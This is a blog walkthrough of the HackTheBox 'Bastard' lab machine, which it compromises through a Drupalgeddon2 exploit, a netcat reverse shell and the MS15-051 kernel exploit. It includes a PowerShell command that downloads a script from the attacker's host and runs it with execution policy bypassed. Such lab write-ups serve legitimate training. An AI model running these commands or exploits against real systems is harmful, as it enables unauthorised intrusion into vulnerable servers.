---
layout: post
title: "HackTheBox - Bastard"
description: "Walkthrough of Bastard box on Hackthebox."
thumb_image: "documentation/bastardthumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/bastard.webp"
path-detail="documentation/bastard.webp"
alt="HTB Bastard" %}

## HTB - Bastard

IP - 10.10.10.9

### Overview

This box was a medium level linux box on HTB created by [ch4p](https://www.hackthebox.eu/home/users/profile/1), it started with finding a exploit for the `drupal 7.54` running on the Microsoft IIS http server at port 80, the exploit gave us a shell as `iusr` who had perms to read user flag from dimitris user account. We got shell as `nt authority\system` by using `MS15-051 exploit`.

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
nmap -sC -sV -oA nmap/results 10.10.10.9
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
# Nmap 7.80 scan initiated Sun Nov 22 13:19:35 2020 as: nmap -sC -sV -o nmap/initial 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 22 13:20:56 2020 -- 1 IP address (1 host up) scanned in 80.39 seconds
{% endhighlight %}

Microsoft IIS http 7.5 server hosting a drupal cms, aight let's start enumerating the webserver as well as run an all port scan. 

#### Enumerating the web server

{% include image.html path="documentation/bastardweb.webp"
path-detail="documentation/bastardweb.webp"
alt="HTB Bastard" %}

Drupal default page, time to enumerate more using `droopescan`. it gave us the exact drupal version `7.5`. Now we can use searchsploit to find exploits for the specific version.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Bastard]
└──╼ $searchsploit drupal
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
...
Drupal 7.x Module Services - Remote Code Execution                                                   | php/webapps/41564.php
...
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                             | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                          | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                  | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)              | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                     | php/webapps/44448.py
...
----------------------------------------------------------------------------------------------------- ---------------------------------
{% endhighlight %} 

### Exploitation

Trying exploit `php/webapps/44449.rb`. First issue I faced when was `\r` symbols in exploit script, but it can be easily fixed using `dos2unix 44449.rb`, another error I faced was `/usr/lib/ruby/2.7.0/rubygems/core_ext/kernel_require.rb:92:in 'require': cannot load such file -- highline/import (LoadError)`, simply googling the error lead me to this [issue](https://github.com/dreadlocked/Drupalgeddon2/issues/55) and so I fixed it with `sudo gem install highline`.

Finally time to run the exploit.
{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Hacking/Pentest/HTB/Boxes/Bastard]
└──╼ $ruby 44449.rb http://10.10.10.9 
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
...
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
...
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> 
{% endhighlight %} 

Yes, Got a shell as `nt authority\iusr`.

{% include image.html path="documentation/bastard.gif"
path-detail="documentation/bastard.gif"
alt="HTB Bastard" %}

### Getting User

Although I have a RCE on the box, it's not a proper shell(as we can't exit drupal directory). So I am using `netcat` to get a reverse shell. First I hosted `nc.exe` using a `smb server` then ran `nc.exe` on the remote box to get a reverse shell.

{% include image.html path="documentation/bastardrevshell.gif"
path-detail="documentation/bastardrevshell.gif"
alt="HTB Bastard" %}

### Rooting the box

In post enumeration, running [Sherlock](https://github.com/rasta-mouse/Sherlock) to find any privilege escalation exploit.

{% highlight bash %}
C:\Users\dimitris\Desktop>@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.15:8000/Sherlock.ps1'))"
...
Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
...
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
...
C:\Users\dimitris\Desktop>
{% endhighlight %} 

`MS15-051` looks intresting. _I did tried MS16-32 but it didn't worked._ 
Got the exploit from this [github repo](https://github.com/SecWiki/windows-kernel-exploits) this [zip archive](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) had the compiled exploit. Copied the `x64 exploit` to windows box using smb server and later used the exploit to get shell as `nt authority\system`.

Here is the POC of exploit usage. 

{% include image.html path="documentation/bastardroot.gif"
path-detail="documentation/bastardroot.gif"
alt="HTB Bastard" %}

Now we can read that `root` flag.

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.

